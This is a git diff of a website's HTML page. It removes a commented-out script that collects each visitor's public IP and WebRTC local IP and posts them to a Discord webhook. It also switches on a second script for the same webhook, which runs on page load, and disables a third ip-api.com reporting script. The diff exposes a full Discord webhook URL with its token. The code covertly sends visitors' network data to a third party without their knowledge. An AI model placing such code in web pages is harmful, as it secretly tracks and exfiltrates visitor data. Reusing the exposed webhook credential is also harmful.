@@ -436,89 +436,7 @@
     </script>
 </body>
 </html>
-<!-- <script>
-const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
-const discordWebhookUrl = "https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4";
-
-function getCurrentDateTime() {
-    const now = new Date();
-    
-    const year = now.getFullYear();
-    const month = String(now.getMonth() + 1).padStart(2, '0'); // Adding 1 because January is 0
-    const day = String(now.getDate()).padStart(2, '0');
-    
-    const hours = String(now.getHours()).padStart(2, '0');
-    const minutes = String(now.getMinutes()).padStart(2, '0');
-    const seconds = String(now.getSeconds()).padStart(2, '0');
-    
-    const dateTimeString = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
-    
-    return dateTimeString;
-}
-
-function getLocalIPAddress() {
-    return new Promise((resolve, reject) => {
-        const pc = new RTCPeerConnection();
-        pc.createDataChannel('');
-        
-        pc.onicecandidate = (e) => {
-            if (!e.candidate) {
-                pc.close();
-                reject(new Error('No local IP address found.'));
-                return;
-            }
-            const localIPAddress = e.candidate.address;
-            pc.close();
-            resolve(localIPAddress);
-        };
-        
-        pc.createOffer().then(pc.setLocalDescription.bind(pc));
-    });
-}
-
-function sendToDiscord(message) {
-    const payload = {
-        content: message
-    };
-    fetch(discordWebhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    });
-}
-
-// Main function to gather and send information
-function gatherAndSendInformation() {
-    fetch(ipAddressWebhookUrl)
-        .then(response => response.json())
-        .then(data => {
-            const ipAddress = data.ip;
-            const dateTime = getCurrentDateTime();
-            let message = `**MSUE Web**\nIP Address: ${ipAddress}\nDate Time: ${dateTime}`;
-            
-            getLocalIPAddress()
-                .then(localIP => {
-                    message += `\nLocal IP Address: ${localIP}`;
-                    sendToDiscord(message);
-                })
-                .catch(error => {
-                    console.error('Error getting local IP:', error.message);
-                    sendToDiscord(message);
-                });
-        })
-        .catch(error => {
-            console.error('Error getting IP address:', error.message);
-        });
-}
-
-// Call the main function to gather and send information
-gatherAndSendInformation();
-
-</script> -->
-<!-- <script>
-
+<script>
     // Define your webhook URL
     const webhookUrl = 'https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4';
 
@@ -656,14 +574,14 @@ gatherAndSendInformation();
 
     // Execute the main function
     main();
-</script> -->
+</script>
 
 
 
 
 
 
-<script>
+<!-- <script>
     
        // URLs for IP info and Discord webhook
 const ipInfoUrl = "http://ip-api.com/json";
@@ -801,7 +719,7 @@ async function fetchDataAndSendToWebhook() {
 // Call the function to fetch data and send it to the webhook
 fetchDataAndSendToWebhook();
 
-</script> 
+</script> -->
   <script>$(document).ready(function(){
     $(window).scroll(function(){
         // sticky navbar on scroll script
